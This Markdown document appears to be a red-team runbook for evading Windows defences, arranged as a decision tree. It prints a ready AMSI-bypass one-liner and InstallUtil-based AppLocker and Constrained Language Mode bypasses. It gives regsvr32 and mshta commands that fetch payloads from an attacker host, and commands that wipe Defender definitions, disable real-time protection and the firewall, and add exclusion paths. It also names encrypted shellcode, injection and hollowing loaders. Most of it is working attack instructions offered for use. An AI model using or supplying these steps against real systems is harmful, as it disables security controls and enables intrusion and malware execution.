# Evasion Runbook

> Choose your bypass based on what's blocking you. Stack them when needed.

---

## Decision Tree

```
What's blocking you?
│
├── PowerShell scripts blocked by AMSI (error: "This script contains malicious content")
│   └── → amsi-bypass/
│
├── PowerShell is in Constrained Language Mode ($ExecutionContext.SessionState.LanguageMode = ConstrainedLanguage)
│   └── → clm-bypass/
│
├── .exe or .dll blocked by AppLocker ("This program is blocked by group policy")
│   └── → applocker-bypass/
│
├── Windows Defender catching files you drop on disk
│   └── → defender-bypass/ (disable) OR use encrypted loaders (03-loaders/shellcode-runners/clrunner.cs)
│
└── All of the above
    └── Stack: disable Defender → AppLocker bypass → AMSI bypass inside that PS session → CLM bypass
```

---

## AMSI Bypass (`amsi-bypass/`)

**When to use:** Any time you run PowerShell code in memory and get blocked.

### Symptom
```
At line:1 char:1
IEX(New-Object Net.WebClient).DownloadString(...)
This script contains malicious content and has been blocked by your antivirus software.
```

### Quick One-Liner (paste in PS before anything else)
```powershell
# From amsi-bypass/ps-amsi-bypass.ps1
# Sets the amsiInitFailed field to $true, which makes AMSI think initialization failed
# and bypasses all subsequent scanning
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```

### C# Patching (from psbypass.cs — patches AMSI.dll in memory)
See `amsi-bypass/csharp-amsi-bypass.cs` — this is the more reliable version for use in C# tooling.

### Notes
- The PS one-liner works in most environments but is HEAVILY SIGNATURED
- Obfuscate it before use in a real engagement
- The C# version patches `amsi.dll` functions directly in memory — harder to detect
- These need to run BEFORE any AMSI-scanned code

---

## CLM Bypass (`clm-bypass/`)

**When to use:** PowerShell is available but locked in Constrained Language Mode.

### Symptom
```powershell
$ExecutionContext.SessionState.LanguageMode
# Returns: ConstrainedLanguage
```

CLM blocks:
- `Add-Type` (no compiling C# in PS)
- COM object creation
- Reflection calls to .NET
- Script block logging bypass is harder

### Bypass: Custom PS Runspace via C# (`clm-bypass/psbypass.cs`)

The trick: Create a **new PowerShell runspace in C#**. This runspace runs in `FullLanguage` mode because it's spawned by a C# executable, not PS itself.

1. Compile `psbypass.cs` to `psbypass.exe`
2. Run via InstallUtil (if AppLocker active): see applocker-bypass below
3. Or run directly if AppLocker isn't an issue

**Compile — Visual Studio (Windows dev box):**
1. File → New → Console App (.NET Framework), name `psbypass`, .NET Framework 4.8
2. Paste `psbypass.cs`, delete defaults
3. Right-click References → Add Reference → Browse → `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`
4. Project → Properties → Build → Platform target: **x64**, ☑ Allow unsafe code
5. Build → Build Solution → `bin\x64\Debug\psbypass.exe`

**Alt (Windows cmd):** `csc.exe /unsafe /platform:x64 /r:System.Management.Automation.dll /out:psbypass.exe psbypass.cs`

```cmd
:: Run directly (if AppLocker not active)
.\psbypass.exe

:: Run via InstallUtil (if AppLocker is blocking .exe)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U psbypass.exe
```

### Notes
- This also patches AMSI inside the C# runspace before launching PS
- The resulting PS shell runs with FullLanguage mode
- You'll see a `PS>` prompt when it's ready

---

## AppLocker Bypass (`applocker-bypass/`)

**When to use:** Custom .exe or .dll files are blocked from executing.

### Symptom
```
This program is blocked by group policy. For more information, contact your system administrator.
```

### Check AppLocker Rules
```powershell
Get-AppLockerPolicy -Effective | select -expandproperty RuleCollections
# Look for: what's whitelisted? C:\Windows\? C:\Program Files\?
```

### Bypass 1: InstallUtil (applocker-bypass/installutil-bypass.cs)

`InstallUtil.exe` is a Microsoft-signed binary in `C:\Windows\Microsoft.NET\`. AppLocker typically whitelists everything under `C:\Windows\`. It runs the `Uninstall()` method of a class inheriting from `Installer`.

**Compile — Visual Studio (Windows dev box):**
1. File → New → Console App (.NET Framework), name `payload`, .NET Framework 4.8
2. Paste your `.cs` file, delete defaults
3. Project → Properties → Build → Platform target: **x64**, ☑ Allow unsafe code
4. Build → Build Solution → `bin\x64\Debug\payload.exe`

**Alt (Windows cmd):** `csc.exe /unsafe /platform:x64 /out:payload.exe payload.cs`

```cmd
# Step 2: Execute via InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# For 32-bit:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

**What AppLocker bypass loaders support this:**
- `clrunner.exe` — shellcode runner
- `clinject.exe` — process injector
- `clhollow.exe` — process hollowing
- `psbypass.exe` — PS runspace (full CLM/AMSI bypass)

### Bypass 2: Writable Whitelisted Directory

AppLocker often whitelists `C:\Windows\Tasks\` or `C:\Windows\Temp\` → drop and execute from there.

```powershell
# Find writable whitelisted paths
Get-AppLockerPolicy -Effective -Xml | Select-String "Path"
# Then test write access to those paths
```

### Bypass 3: regsvr32 (if scripts are whitelisted but .exe isn't)
```cmd
regsvr32 /s /n /u /i:http://<KALI>/payload.sct scrobj.dll
```

### Bypass 4: mshta
```cmd
mshta.exe http://<KALI>/payload.hta
```

---

## Defender Bypass (`defender-bypass/`)

**When to use:** Windows Defender is catching files you need to run on disk.

### Option 1: Disable Defender (requires admin)
```powershell
# From defender-bypass/defender-disable.ps1

# Remove all definitions first (makes Defender temporarily blind)
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all

# Disable via registry (requires admin/SYSTEM)
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f

# Disable via PowerShell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

# Disable firewall too
NetSh Advfirewall set allprofiles state off
```

### Option 2: Use Encrypted Loaders (don't need admin)

Don't fight Defender — encrypt your payload so it's unrecognizable on disk.

- **clrunner.cs** — AES-encrypted payload, only decrypts in memory at runtime
- **clinject.cs** — same, injects into another process
- **clhollow.cs** — same, uses process hollowing

### Option 3: Exclusion Path
```powershell
# Add path exclusion (requires admin)
Add-MpPreference -ExclusionPath "C:\Users\Public\"
Set-MpPreference -ExclusionPath "C:\Temp\"
```

### Notes
- Defender can be re-enabled by automatic updates — act quickly
- Some orgs have tamper protection — registry method won't work
- If tamper protection is on, you need SYSTEM-level to disable it
- Best practice: encrypt your payload rather than relying on disabling Defender
